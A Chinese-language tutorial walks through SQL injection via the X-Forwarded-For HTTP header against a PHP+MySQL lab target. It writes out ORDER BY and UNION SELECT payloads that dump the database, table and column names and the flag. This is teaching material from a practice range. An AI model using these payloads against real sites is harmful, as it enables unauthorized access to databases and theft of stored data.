HTTP头的基本注入

HTTP头部详解:

1.User-Agent：使得服务器能够识别客户使用的操作系统，游览器版本等.（很多数据量大的网站中会记录客户使用的操作系统或浏览器版本等存入数据库中）

2.Cookie：网站为了辨别用户身份、进行 session 跟踪而储存在用户本地终端上的数据（通常经过加密）.

3.X-Forwarded-For：简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP,（通常一些网站的防注入功能会记录请求端真实IP地址并写入数据库or某文件\[通过修改XXF头可以实现伪造IP\]）.

4.Clien-IP：同上，不做过多介绍.

5.Rerferer：浏览器向 WEB 服务器表明自己是从哪个页面链接过来的.

6.Host：客户端指定自己想访问的WEB服务器的域名/IP 地址和端口号

**注：本章依旧使用靶机做讲解；**

**配置是：PHP+MySQL**

1.抓取页面的包鼠标右击发往Repeater里：

![](../Images/7751b1a8a3c13e3f72e8ecd862b45b74.png)

2.在Repeater先点击GO一下

在Host下面一行加x-forwarded-for:

![](../Images/2c9e51f7a423765229368086ff1d02a4.png)

3.先x-forwarded-for:order by 查字段数

查到order by 字段数为4,查5报错

![](../Images/b1e269f543a0c4f60d6313e17db23177.png)

4.爆数据库：union select 1,2,database(),4  
得到数据库名:pentesterlab

![](../Images/4ae59fed913e996d0da1f4f83186f28b.png)

5.然后爆表名：

union select 1,2,group\_concat(table\_name) from information\_schema.tables where table\_schema='pentesterlab',4  
得到的表：comment,flag,goods,user

![](../Images/1b00b51e6ecae05eb9becbc926d8866d.png)

6.然后爆列名：

union select 1,2,3,group\_concat(column\_name) from information\_schema.columns where table\_schema='pentesterlab' and table\_name='flag'  
得到列：id,flag

![](../Images/7cacc85d43c2aff9cd023ebb75731c29.png)

7.

然后爆数据：

union select 1,2,3,group\_concat(id,'-',flag) from pentesterlab.flag

![](../Images/544d400adfaf0df4ca9683b29e813f67.png)

就这样拿到靶场flag了；需注意写注入语句是英文编辑。

![](../Images/293ce1fd5cff4dcfed507431496cf199.png)
